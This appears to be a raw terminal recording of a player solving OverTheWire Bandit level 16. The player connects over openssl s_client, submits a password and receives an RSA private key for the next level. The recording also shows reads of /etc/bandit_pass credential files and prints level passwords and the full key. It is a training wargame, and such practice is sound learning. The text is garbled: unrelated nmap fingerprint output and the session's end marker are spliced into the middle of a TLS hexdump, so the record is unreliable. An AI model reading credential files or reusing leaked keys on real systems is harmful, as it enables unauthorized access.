@@ -1,0 +1,1484 @@
+Script started on 2024-08-16 18:30:54+03:00 [TERM="xterm-256color" TTY="/dev/pts/6" COLUMNS="72" LINES="31"]
+]4;0;#090809\]4;1;#C05432\]4;2;#D56520\]4;3;#768B5F\]4;4;#E5902A\]4;5;#BE9856\]4;6;#DB9C5E\]4;7;#eee2c8\]4;8;#a69e8c\]4;9;#C05432\]4;10;#D56520\]4;11;#768B5F\]4;12;#E5902A\]4;13;#BE9856\]4;14;#DB9C5E\]4;15;#eee2c8\]10;#eee2c8\]11;#090809\]12;#eee2c8\]13;#eee2c8\]17;#eee2c8\]19;#090809\]4;232;#090809\]4;256;#eee2c8\]708;#090809\]4;0;#090809\]4;1;#C05432\]4;2;#D56520\]4;3;#768B5F\]4;4;#E5902A\]4;5;#BE9856\]4;6;#DB9C5E\]4;7;#eee2c8\]4;8;#a69e8c\]4;9;#C05432\]4;10;#D56520\]4;11;#768B5F\]4;12;#E5902A\]4;13;#BE9856\]4;14;#DB9C5E\]4;15;#eee2c8\]10;#eee2c8\]11;#090809\]12;#eee2c8\]13;#eee2c8\]17;#eee2c8\]19;#090809\]4;232;#090809\]4;256;#eee2c8\]708;#090809\[?2004h[feizal@mzamilsaid--->~]$ ssh bandit16@ [Kbandit.labs.overthewire.org -o [K[Kp 22 20
+[?2004l                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit16@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /opt/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+[?2004h]0;bandit16@bandit: ~[01;32mbandit16@bandit[00m:[01;34m~[00m$ openssl s_cliet[Kt[Knt --connectlocalhost [K:31790[C[C[C[C[C[C[C[C localhost:31790
+[?2004lCONNECTED(00000003)
+Can't use SSL_get_servername
+depth=0 CN = SnakeOil
+verify error:num=18:self-signed certificate
+verify return:1
+depth=0 CN = SnakeOil
+verify return:1
+---
+Certificate chain
+ 0 s:CN = SnakeOil
+   i:CN = SnakeOil
+   a:PKEY: rsaEncryption, 4096 (bit); sigalg: RSA-SHA256
+   v:NotBefore: Jun 10 03:59:50 2024 GMT; NotAfter: Jun  8 03:59:50 2034 GMT
+---
+Server certificate
+-----BEGIN CERTIFICATE-----
+MIIFBzCCAu+gAwIBAgIUBLz7DBxA0IfojaL/WaJzE6Sbz7cwDQYJKoZIhvcNAQEL
+BQAwEzERMA8GA1UEAwwIU25ha2VPaWwwHhcNMjQwNjEwMDM1OTUwWhcNMzQwNjA4
+MDM1OTUwWjATMREwDwYDVQQDDAhTbmFrZU9pbDCCAiIwDQYJKoZIhvcNAQEBBQAD
+ggIPADCCAgoCggIBANI+P5QXm9Bj21FIPsQqbqZRb5XmSZZJYaam7EIJ16Fxedf+
+jXAv4d/FVqiEM4BuSNsNMeBMx2Gq0lAfN33h+RMTjRoMb8yBsZsC063MLfXCk4p+
+09gtGP7BS6Iy5XdmfY/fPHvA3JDEScdlDDmd6Lsbdwhv93Q8M6POVO9sv4HuS4t/
+jEjr+NhE+Bjr/wDbyg7GL71BP1WPZpQnRE4OzoSrt5+bZVLvODWUFwinB0fLaGRk
+GmI0r5EUOUd7HpYyoIQbiNlePGfPpHRKnmdXTTEZEoxeWWAaM1VhPGqfrB/Pnca+
+vAJX7iBOb3kHinmfVOScsG/YAUR94wSELeY+UlEWJaELVUntrJ5HeRDiTChiVQ++
+wnnjNbepaW6shopybUF3XXfhIb4NvwLWpvoKFXVtcVjlOujF0snVvpE+MRT0wacy
+tHtjZs7Ao7GYxDz6H8AdBLKJW67uQon37a4MI260ADFMS+2vEAbNSFP+f6ii5mrB
+18cY64ZaF6oU8bjGK7BArDx56bRc3WFyuBIGWAFHEuB948BcshXY7baf5jjzPmgz
+mq1zdRthQB31MOM2ii6vuTkheAvKfFf+llH4M9SnES4NSF2hj9NnHga9V08wfhYc
+x0W6qu+S8HUdVF+V23yTvUNgz4Q+UoGs4sHSDEsIBFqNvInnpUmtNgcR2L5PAgMB
+AAGjUzBRMB0GA1UdDgQWBBTPo8kfze4P9EgxNuyk7+xDGFtAYzAfBgNVHSMEGDAW
+gBTPo8kfze4P9EgxNuyk7+xDGFtAYzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3
+DQEBCwUAA4ICAQAKHomtmcGqyiLnhziLe97Mq2+Sul5QgYVwfx/KYOXxv2T8ZmcR
+Ae9XFhZT4jsAOUDK1OXx9aZgDGJHJLNEVTe9zWv1ONFfNxEBxQgP7hhmDBWdtj6d
+taqEW/Jp06X+08BtnYK9NZsvDg2YRcvOHConeMjwvEL7tQK0m+GVyQfLYg6jnrhx
+egH+abucTKxabFcWSE+Vk0uJYMqcbXvB4WNKz9vj4V5Hn7/DN4xIjFko+nREw6Oa
+/AUFjNnO/FPjap+d68H1LdzMH3PSs+yjGid+6Zx9FCnt9qZydW13Miqg3nDnODXw
++Z682mQFjVlGPCA5ZOQbyMKY4tNazG2n8qy2famQT3+jF8Lb6a4NGbnpeWnLMkIu
+jWLWIkA9MlbdNXuajiPNVyYIK9gdoBzbfaKwoOfSsLxEqlf8rio1GGcEV5Hlz5S2
+txwI0xdW9MWeGWoiLbZSbRJH4TIBFFtoBG0LoEJi0C+UPwS8CDngJB4TyrZqEld3
+rH87W+Et1t/Nepoc/Eoaux9PFp5VPXP+qwQGmhir/hv7OsgBhrkYuhkjxZ8+1uk7
+tUWC/XM0mpLoxsq6vVl3AJaJe1ivdA9xLytsuG4iv02Juc593HXYR8yOpow0Eq2T
+U5EyeuFg5RXYwAPi7ykw1PW7zAPL4MlonEVz+QXOSx6eyhimp1VZC11SCg==
+-----END CERTIFICATE-----
+subject=CN = SnakeOil
+issuer=CN = SnakeOil
+---
+No client certificate CA names sent
+Peer signing digest: SHA256
+Peer signature type: RSA-PSS
+Server Temp Key: X25519, 253 bits
+---
+SSL handshake has read 2103 bytes and written 373 bytes
+Verification error: self-signed certificate
+---
+New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
+Server public key is 4096 bit
+Secure Renegotiation IS NOT supported
+Compression: NONE
+Expansion: NONE
+No ALPN negotiated
+Early data was not sent
+Verify return code: 18 (self-signed certificate)
+---
+---
+Post-Handshake New Session Ticket arrived:
+SSL-Session:
+    Protocol  : TLSv1.3
+    Cipher    : TLS_AES_256_GCM_SHA384
+    Session-ID: 8DCEEE68C6746100097F009F9CBD858DFC752F52A23BF72E59192735B5FDBB4B
+    Session-ID-ctx: 
+    Resumption PSK: 84B79B9A763823ACB762E7B48B5E77C5FD1D2A1AA84F3238296C66FD148497A816A8BF659DFE7ABD0EBD465BC28AA28B
+    PSK identity: None
+    PSK identity hint: None
+    SRP username: None
+    TLS session ticket lifetime hint: 300 (seconds)
+    TLS session ticket:
+    0000 - b7 88 49 23 64 af 58 70-c8 19 66 f3 35 a6 ce 25   ..I#d.Xp..f.5..%
+    0010 - 44 01 0a fd 82 37 ed ba-dd 57 24 f3 0b 62 59 a5   D....7...W$..bY.ation\n")%r(SIPOptions,39,"100
+SF:\x20phrack\x20search\x20daemon,\x20type\x20help\x20for\x20more\x20infor
+SF:mation\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port8080-TCP:V=7.94SVN%I=7%D=8/16%Time=66BF6EBE%P=x86_64-pc-linux-gnu%r
+SF:(NULL,21,"0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port30000-TCP:V=7.94SVN%I=7%D=8/16%Time=66BF6EC4%P=x86_64-pc-linux-gnu%
+SF:r(GenericLines,32,"Wrong!\x20Please\x20enter\x20the\x20correct\x20curre
+SF:nt\x20password\.\n")%r(GetRequest,32,"Wrong!\x20Please\x20enter\x20the\
+SF:x20correct\x20current\x20password\.\n")%r(HTTPOptions,32,"Wrong!\x20Ple
+SF:ase\x20enter\x20the\x20correct\x20current\x20password\.\n")%r(RTSPReque
+SF:st,32,"Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20passwo
+SF:rd\.\n")%r(Help,32,"Wrong!\x20Please\x20enter\x20the\x20correct\x20curr
+SF:ent\x20password\.\n")%r(FourOhFourRequest,32,"Wrong!\x20Please\x20enter
+SF:\x20the\x20correct\x20current\x20password\.\n")%r(LPDString,32,"Wrong!\
+SF:x20Please\x20enter\x20the\x20correct\x20current\x20password\.\n")%r(SIP
+SF:Options,32,"Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20p
+SF:assword\.\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port50001-TCP:V=7.94SVN%I=7%D=8/16%Time=66BF6EC9%P=x86_64-pc-linux-gnu%
+SF:r(GenericLines,32,"Wrong!\x20Please\x20enter\x20the\x20correct\x20curre
+SF:nt\x20password\.\n")%r(GetRequest,32,"Wrong!\x20Please\x20enter\x20the\
+SF:x20correct\x20current\x20password\.\n")%r(HTTPOptions,32,"Wrong!\x20Ple
+SF:ase\x20enter\x20the\x20correct\x20current\x20password\.\n")%r(RTSPReque
+SF:st,32,"Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20passwo
+SF:rd\.\n")%r(Help,32,"Wrong!\x20Please\x20enter\x20the\x20correct\x20curr
+SF:ent\x20password\.\n")%r(FourOhFourRequest,32,"Wrong!\x20Please\x20enter
+SF:\x20the\x20correct\x20current\x20password\.\n")%r(LPDString,32,"Wrong!\
+SF:x20Please\x20enter\x20the\x20correct\x20current\x20password\.\n")%r(SIP
+SF:Options,32,"Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20p
+SF:assword\.\n");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 164.66 seconds
+[?2004h]0;bandit16@bandit: ~[01;32mbandit16@bandit[00m:[01;34m~[00m$ Connection to bandit.labs.overthewire.org closed by remote host.
+Connection to bandit.labs.overthewire.org closed.
+[?2004h[feizal@mzamilsaid--->~]$ [K[feizal@mzamilsaid--->~]$ [K[feizal@mzamilsaid--->~]$ [?2004l
+exit
+
+Script done on 2024-08-16 19:21:52+03:00 [COMMAND_EXIT_CODE="255"]
+  i..b.]..,......8
+
+    Start Time: 1723822317
+    Timeout   : 7200 (sec)
+    Verify return code: 18 (self-signed certificate)
+    Extended master secret: no
+    Max Early Data: 0
+---
+read R BLOCK
+kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
+KEYUPDATE
+kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
+KEYUPDATE
+kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
+KEYUPDATE
+^C
+[?2004h]0;bandit16@bandit: ~[01;32mbandit16@bandit[00m:[01;34m~[00m$ cat[Kcat /etc.[K/bandit_pass/a[Kbanditt[K16
+[?2004lkSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
+[?2004h]0;bandit16@bandit: ~[01;32mbandit16@bandit[00m:[01;34m~[00m$ cat  /etc/passwd[K[K[K[K[K[Kbandit_pass/bandit18[K7
+[?2004lcat: /etc/bandit_pass/bandit17: Permission denied
+[?2004h]0;bandit16@bandit: ~[01;32mbandit16@bandit[00m:[01;34m~[00m$ cat  /etc/bandit_pass/bandit17[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P/etc/bandit_pass/bandit16[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Copenssl s_client --connect localhost:31790[K[K[K[K1792[K0[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@e[1@c[1@h[C[1@o[1@ [1@"[7mkSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx[27mopenssl s_client --connect localhost:31790[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[CkSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx"openssl s_clien[1@t[A]0;bandit16@bandit: ~[01;32mbandit16@bandit[00m:[01;34m~[00m$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C openssl s_clie[1@n[A]0;bandit16@bandit: ~[01;32mbandit16@bandit[00m:[01;34m~[00m$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C|openssl s_cli[1@e[A]0;bandit16@bandit: ~[01;32mbandit16@bandit[00m:[01;34m~[00m$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C openssl s_cl[1@i[A]0;bandit16@bandit: ~[01;32mbandit16@bandit[00m:[01;34m~[00m$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C -iign_eof[C[1Pgn_eof
+[?2004lCONNECTED(00000003)
+Can't use SSL_get_servername
+depth=0 CN = SnakeOil
+verify error:num=18:self-signed certificate
+verify return:1
+depth=0 CN = SnakeOil
+verify return:1
+---
+Certificate chain
+ 0 s:CN = SnakeOil
+   i:CN = SnakeOil
+   a:PKEY: rsaEncryption, 4096 (bit); sigalg: RSA-SHA256
+   v:NotBefore: Jun 10 03:59:50 2024 GMT; NotAfter: Jun  8 03:59:50 2034 GMT
+---
+Server certificate
+-----BEGIN CERTIFICATE-----
+MIIFBzCCAu+gAwIBAgIUBLz7DBxA0IfojaL/WaJzE6Sbz7cwDQYJKoZIhvcNAQEL
+BQAwEzERMA8GA1UEAwwIU25ha2VPaWwwHhcNMjQwNjEwMDM1OTUwWhcNMzQwNjA4
+MDM1OTUwWjATMREwDwYDVQQDDAhTbmFrZU9pbDCCAiIwDQYJKoZIhvcNAQEBBQAD
+ggIPADCCAgoCggIBANI+P5QXm9Bj21FIPsQqbqZRb5XmSZZJYaam7EIJ16Fxedf+
+jXAv4d/FVqiEM4BuSNsNMeBMx2Gq0lAfN33h+RMTjRoMb8yBsZsC063MLfXCk4p+
+09gtGP7BS6Iy5XdmfY/fPHvA3JDEScdlDDmd6Lsbdwhv93Q8M6POVO9sv4HuS4t/
+jEjr+NhE+Bjr/wDbyg7GL71BP1WPZpQnRE4OzoSrt5+bZVLvODWUFwinB0fLaGRk
+GmI0r5EUOUd7HpYyoIQbiNlePGfPpHRKnmdXTTEZEoxeWWAaM1VhPGqfrB/Pnca+
+vAJX7iBOb3kHinmfVOScsG/YAUR94wSELeY+UlEWJaELVUntrJ5HeRDiTChiVQ++
+wnnjNbepaW6shopybUF3XXfhIb4NvwLWpvoKFXVtcVjlOujF0snVvpE+MRT0wacy
+tHtjZs7Ao7GYxDz6H8AdBLKJW67uQon37a4MI260ADFMS+2vEAbNSFP+f6ii5mrB
+18cY64ZaF6oU8bjGK7BArDx56bRc3WFyuBIGWAFHEuB948BcshXY7baf5jjzPmgz
+mq1zdRthQB31MOM2ii6vuTkheAvKfFf+llH4M9SnES4NSF2hj9NnHga9V08wfhYc
+x0W6qu+S8HUdVF+V23yTvUNgz4Q+UoGs4sHSDEsIBFqNvInnpUmtNgcR2L5PAgMB
+AAGjUzBRMB0GA1UdDgQWBBTPo8kfze4P9EgxNuyk7+xDGFtAYzAfBgNVHSMEGDAW
+gBTPo8kfze4P9EgxNuyk7+xDGFtAYzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3
+DQEBCwUAA4ICAQAKHomtmcGqyiLnhziLe97Mq2+Sul5QgYVwfx/KYOXxv2T8ZmcR
+Ae9XFhZT4jsAOUDK1OXx9aZgDGJHJLNEVTe9zWv1ONFfNxEBxQgP7hhmDBWdtj6d
+taqEW/Jp06X+08BtnYK9NZsvDg2YRcvOHConeMjwvEL7tQK0m+GVyQfLYg6jnrhx
+egH+abucTKxabFcWSE+Vk0uJYMqcbXvB4WNKz9vj4V5Hn7/DN4xIjFko+nREw6Oa
+/AUFjNnO/FPjap+d68H1LdzMH3PSs+yjGid+6Zx9FCnt9qZydW13Miqg3nDnODXw
++Z682mQFjVlGPCA5ZOQbyMKY4tNazG2n8qy2famQT3+jF8Lb6a4NGbnpeWnLMkIu
+jWLWIkA9MlbdNXuajiPNVyYIK9gdoBzbfaKwoOfSsLxEqlf8rio1GGcEV5Hlz5S2
+txwI0xdW9MWeGWoiLbZSbRJH4TIBFFtoBG0LoEJi0C+UPwS8CDngJB4TyrZqEld3
+rH87W+Et1t/Nepoc/Eoaux9PFp5VPXP+qwQGmhir/hv7OsgBhrkYuhkjxZ8+1uk7
+tUWC/XM0mpLoxsq6vVl3AJaJe1ivdA9xLytsuG4iv02Juc593HXYR8yOpow0Eq2T
+U5EyeuFg5RXYwAPi7ykw1PW7zAPL4MlonEVz+QXOSx6eyhimp1VZC11SCg==
+-----END CERTIFICATE-----
+subject=CN = SnakeOil
+issuer=CN = SnakeOil
+---
+No client certificate CA names sent
+Peer signing digest: SHA256
+Peer signature type: RSA-PSS
+Server Temp Key: X25519, 253 bits
+---
+SSL handshake has read 2103 bytes and written 373 bytes
+Verification error: self-signed certificate
+---
+New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
+Server public key is 4096 bit
+Secure Renegotiation IS NOT supported
+Compression: NONE
+Expansion: NONE
+No ALPN negotiated
+Early data was not sent
+Verify return code: 18 (self-signed certificate)
+---
+---
+Post-Handshake New Session Ticket arrived:
+SSL-Session:
+    Protocol  : TLSv1.3
+    Cipher    : TLS_AES_256_GCM_SHA384
+    Session-ID: 07DF903F481C7877201E0D442817AC9491F47EA2C874FCE25978CBDDFECE1040
+    Session-ID-ctx: 
+    Resumption PSK: D0A56E95FADEA693A5FFD549482CF0F9A238968B74E36020C7A777B99F7165EBB0FD66445D1ABE4316AD0331D654405B
+    PSK identity: None
+    PSK identity hint: None
+    SRP username: None
+    TLS session ticket lifetime hint: 300 (seconds)
+    TLS session ticket:
+    0000 - b7 88 49 23 64 af 58 70-c8 19 66 f3 35 a6 ce 25   ..I#d.Xp..f.5..%
+    0010 - ac b0 9d 3c 9a 08 be 4a-3d 33 0f d4 68 e9 69 a2   ...<...J=3..h.i.
+    0020 - 8e a6 ea 1f 9e c8 f6 60-b8 78 c0 e7 bc b5 fa 3f   .......`.x.....?
+    0030 - bf 1c f8 48 11 8b 12 63-bc a7 46 12 b8 c9 8b fe   ...H...c..F.....
+    0040 - 54 36 41 8d 5b 24 af 76-af 3c 90 8c 40 57 b8 3b   T6A.[$.v.<..@W.;
+    0050 - 45 4b a6 90 24 be 58 6c-b3 c6 f8 6f 29 8a 00 9f   EK..$.Xl...o)...
+    0060 - 34 39 cf d2 ff ac 9e 35-b8 75 2f 27 bf ca 49 5f   49.....5.u/'..I_
+    0070 - 72 b9 a4 f6 cc 26 a9 af-bd 89 8c 4d 75 cd e1 13   r....&.....Mu...
+    0080 - a0 cd ec ec 72 d6 da 75-d7 f7 42 af 87 8e e7 67   ....r..u..B....g
+    0090 - 24 19 fa bb 6d 9c 30 6c-b0 59 84 d8 16 f5 07 38   $...m.0l.Y.....8
+    00a0 - af 19 d3 5f 32 41 47 31-ff 6a 61 6e 8c 00 34 ae   ..._2AG1.jan..4.
+    00b0 - af 61 e3 47 4c 46 c8 2e-ef 44 5a 24 14 99 bd 82   .a.GLF...DZ$....
+    00c0 - 48 90 8c e6 72 fa 8f ba-6c 10 15 bd 62 ac 90 53   H...r...l...b..S
+    00d0 - 5e f0 c1 0e 9c c6 28 1d-e9 c2 bf 4e ab 17 ce dd   ^.....(....N....
+
+    Start Time: 1723822495
+    Timeout   : 7200 (sec)
+    Verify return code: 18 (self-signed certificate)
+    Extended master secret: no
+    Max Early Data: 0
+---
+read R BLOCK
+---
+Post-Handshake New Session Ticket arrived:
+SSL-Session:
+    Protocol  : TLSv1.3
+    Cipher    : TLS_AES_256_GCM_SHA384
+    Session-ID: EA97A8F2B71741AA2EA80F8BBAEEDC28F7317EC43402E03397DA9D08F684E0D3
+    Session-ID-ctx: 
+    Resumption PSK: DE056855C713CEADDE3FCB0E1DFD538E2282AB5001E110081C7B4CB4BE920BC7582CFAD0728377F79943D339ABF24860
+    PSK identity: None
+    PSK identity hint: None
+    SRP username: None
+    TLS session ticket lifetime hint: 300 (seconds)
+    TLS session ticket:
+    0000 - b7 88 49 23 64 af 58 70-c8 19 66 f3 35 a6 ce 25   ..I#d.Xp..f.5..%
+    0010 - 79 85 12 33 65 7d fc 9d-b9 f4 90 52 21 24 02 5f   y..3e}.....R!$._
+    0020 - 27 4b 77 1d 31 32 96 f5-45 c1 43 ff 8d e6 10 9c   'Kw.12..E.C.....
+    0030 - b4 95 57 fd bc e0 64 05-40 c3 3e 87 e4 95 91 45   ..W...d.@.>....E
+    0040 - a0 a8 52 f5 6a a4 2b 32-f5 19 12 4d 06 c3 12 04   ..R.j.+2...M....
+    0050 - 13 e8 78 49 8f 24 33 35-12 b9 d8 6e cc e3 b7 81   ..xI.$35...n....
+    0060 - 43 ea ea c9 29 17 a3 b6-76 9a c4 19 40 c8 89 34   C...)...v...@..4
+    0070 - d6 ff 20 e0 da ba d2 b1-4d 5f 73 d8 4f 6a 25 3c   .. .....M_s.Oj%<
+    0080 - e5 3a 89 71 28 c4 a2 3d-79 a9 7b 1f 48 21 af b5   .:.q(..=y.{.H!..
+    0090 - 3a cb b8 47 29 db bd 68-10 ce a5 68 ba 86 9b 0f   :..G)..h...h....
+    00a0 - d0 d8 48 46 46 c5 be 76-8a 39 f9 a2 7a 38 87 74   ..HFF..v.9..z8.t
+    00b0 - 84 35 1d 52 76 3d ec 97-8d 35 12 db df 14 77 45   .5.Rv=...5....wE
+    00c0 - f5 29 19 b2 98 7a e5 e5-36 30 e8 4f fe 1a 34 2c   .)...z..60.O..4,
+    00d0 - 86 ff 76 33 ec 5a df f7-99 0b 0d 29 d9 30 82 0c   ..v3.Z.....).0..
+
+    Start Time: 1723822495
+    Timeout   : 7200 (sec)
+    Verify return code: 18 (self-signed certificate)
+    Extended master secret: no
+    Max Early Data: 0
+---
+read R BLOCK
+Correct!
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+closed
+[?2004h]0;bandit16@bandit: ~[01;32mbandit16@bandit[00m:[01;34m~[00m$ cat [Knano bandit17p/key[1Pkey.key
+[?2004l[?2004h[?1049h[22;0;0t[1;31r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[29;20H(B[0;1m[37m[41m[ Directory '.' is not writable ][39;49m(B[m[H(B[0;7m  GNU nano 7.2                  bandit17p.key                           [1;71H(B[m[29;20H  (B[0;1m[37m[41m[ Problems with history file ][39;49m(B[m[K[30d(B[0;7m^G(B[m Help[15G(B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut[30;57H(B[0;7m^T(B[m Execute[31d(B[0;7m^X(B[m Exit[15G(B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Paste[57G(B[0;7m^J(B[m Justify[2d[?12l[?25h[?25l[1;47H(B[0;7m*[29d(B[m[K[1;71H[2dSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd[3dHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt